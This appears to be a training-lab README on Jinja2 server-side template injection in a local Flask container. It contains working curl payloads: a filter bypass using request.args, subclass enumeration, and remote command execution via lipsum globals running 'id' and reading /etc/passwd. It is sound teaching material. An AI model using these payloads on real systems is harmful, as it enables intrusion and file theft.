# Server-Side Template Injection (SSTI) Lab

## Overview

Practice detecting and exploiting Server-Side Template Injection (SSTI) vulnerabilities in Python Flask with the Jinja2 template engine (PortSwigger Web Security Academy topic 11).

- **Default Port / Access**: `http://localhost:8094`
- **Target URL**: `http://localhost:8094/edit`
- **Container Name**: `cyberlab_02_web_ssti_jinja2`
- **Image**: `d4rk10rd/ssti:latest`
- **Shortcut**: `./lab start ssti`

---

## Background & Vulnerability Mechanics

### Jinja2 Template Engine Mechanics

In Python web frameworks like Flask, template engines (such as Jinja2) separate application logic from presentation. Safe implementations pass user input as contextual variables to `render_template()` or `render_template_string()`, where Jinja2 handles escaping and treats values strictly as data:

```python
# SAFE: User input passed as data context
return render_template_string("<h1>Hello {{ name }}</h1>", name=user_input)
```

The vulnerability occurs when untrusted user input is directly concatenated into the template definition before rendering:

```python
# VULNERABLE: User input concatenated into the template code itself
template = "<h1>Hello " + user_input + "</h1>"
return render_template_string(template)
```

When Jinja2 compiles and renders the string, any template delimiters (`{{ ... }}`, `{% ... %}`) provided by the user are evaluated as template expressions with access to the execution context and Python object model.

### Filter Bypass Mechanics

In this specific target lab (`app.py`), the `/edit` endpoint accepts parameters (`ip1`, `ip2`, `ip3`, `ip4`) and concatenates `ip3` directly into the template string. A naive sanitizer strips double underscores (`__`):

```python
def sanitize_input(input_str):
    forbidden_chars = ['__']
    for char in forbidden_chars:
        input_str = input_str.replace(char, '')
    return input_str
```

Because only `ip3` is filtered through `sanitize_input()` while other query parameters remain unfiltered, security testers can bypass the blacklist by passing dunder attribute strings through ancillary query parameters (`request.args`):

```jinja2
{{ ''[request.args.c][request.args.m][1][request.args.s]() }}&c=__class__&m=__mro__&s=__subclasses__
```

---

## Exploitation Workflow

### 1. Detection & Identification

Inject mathematical expressions to determine whether template evaluation occurs and identify the template engine:

- Jinja2 / Twig expression: `{{ 7 * 7 }}` -> evaluates to `49`
- Java / Smarty / Freemarker expressions: `${ 7 * 7 }`, `#{ 7 * 7 }`, `<%= 7 * 7 %>`

**Exact curl Commands**:

```bash
# Using curl with --globoff (-g) to prevent curl brace expansion:
curl -s -g "http://localhost:8094/edit?ip3={{7*7}}" | grep "49"

# Or using standard URL encoding:
curl -s "http://localhost:8094/edit?ip3=%7B%7B7*7%7D%7D" | grep "49"
```

Expected output reflects:

```html
<div class="">49</div>
```

### 2. MRO (Method Resolution Order) Traversal & Subclasses Enumeration

Jinja2 expressions execute within Python. By traversing object attributes (`__class__.__mro__`), testers can navigate up to the base `object` class and enumerate all loaded subclasses in the Python runtime:

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Using the query parameter bypass to navigate around the `__` blacklist:

```bash
curl -s -g "http://localhost:8094/edit?ip3={{''[request.args.c][request.args.m][1][request.args.s]()}}&c=__class__&m=__mro__&s=__subclasses__"
```

This dumps all active subclasses (e.g., `<class 'subprocess.Popen'>`, `<class 'os._wrap_close'>`, file objects, and loaders).

### 3. Remote Code Execution (RCE)

Access `os` or `subprocess` via global environments of built-in helpers (such as `lipsum`, `url_for`, or `cycler`):

```bash
# Execute 'id' command via lipsum globals os.popen
curl -s -g "http://localhost:8094/edit?ip3={{lipsum[request.args.g]['os'].popen('id').read()}}&g=__globals__"
```

Expected output confirms command execution:

```html
<div class="">uid=0(root) gid=0(root) groups=0(root)</div>
```

Read arbitrary files:

```bash
curl -s -g "http://localhost:8094/edit?ip3={{lipsum[request.args.g]['os'].popen('cat+/etc/passwd').read()}}&g=__globals__"
```

---

## PortSwigger Academy Citations & References

- [PortSwigger Web Security Academy: Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger SSTI Methodology](https://portswigger.net/web-security/server-side-template-injection#ssti-methodology)
- [HackTricks: Jinja2 Template Injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

---

## YouTube Walkthroughs & Solving Guides

- [PwnFunction - Server-Side Template Injections Explained](https://www.youtube.com/watch?v=SN6EVIG4c-0)
- [Seven Seas Security - SSTI Complete Lab Breakdown (Basic SSTI)](https://www.youtube.com/watch?v=QLqHMMcBXuQ)
- [Seven Seas Security - SSTI Lab Breakdown (Code Context)](https://www.youtube.com/watch?v=HC8CYztjkA8)
